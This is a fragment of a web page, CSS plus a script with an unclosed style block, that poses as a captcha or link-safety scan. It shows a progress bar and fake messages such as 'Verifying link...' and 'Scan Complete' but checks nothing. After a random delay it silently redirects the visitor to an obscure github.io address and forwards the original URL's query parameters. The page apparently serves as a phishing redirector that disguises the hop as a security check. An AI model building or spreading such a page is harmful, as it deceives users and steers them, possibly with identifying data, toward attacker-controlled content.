    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .captcha-container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .loading-bar {
            width: 100%;
            height: 10px;
            background-color: #ddd;
            margin-top: 20px;
            border-radius: 5px;
            overflow: hidden;
        }
	    .homage{
		 opacity: 0;
	    }
        .loading-progress {
            height: 100%;
            width: 0;
            background-color: #007BFF;
            transition: width 0.3s ease-out;
        }
        .robot-prompt {
            margin-bottom: 20px;
            font-size: 18px;
        }
        @media (max-width: 600px) {
            .captcha-button {
                padding: 15px 30px;
                font-size: 14px;
            }
        }

    <script>
        const progressBar = document.getElementById('loadingProgress');
        const robotPrompt = document.getElementById('robotPrompt');
        let progress = 0;
        const totalDuration = 12000; // 12 seconds
        const minRedirectDelay = 5000; // 5 seconds
        const maxRedirectDelay = 10000; // 10 seconds
        const stepTime = totalDuration / 100; // Time for each 1% step
        const messages = [
            "Verifying link...",
            "Expanding link...",
            "Connecting to a server...",
            "Loading page...",
            "Verifying content...",
            "Extracting page features...",
            "Verifying features...",
            "Scan Complete"
        ];
        let messageIndex = 0;

        function startProgress() {
            const timer = setInterval(() => {
                progress += 1;
                progressBar.style.width = progress + '%';
                if (progress >= 100) {
                    clearInterval(timer);
                }
            }, stepTime);

            const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
            setTimeout(() => {
                const currentUrl = new URL(window.location.href);
                const params = currentUrl.search;
                const redirectUrl = "https://shbfiuqa.github.io/vhifdbksbk/" + params;
                window.location.href = redirectUrl;
            }, redirectDelay);
        }

        function changeMessage() {
            robotPrompt.textContent = messages[messageIndex];
            messageIndex = (messageIndex + 1) % messages.length;
        }

        window.onload = () => {
            startProgress();
            setInterval(changeMessage, 1700); // Change message every 1.7 seconds
        };
    </script>
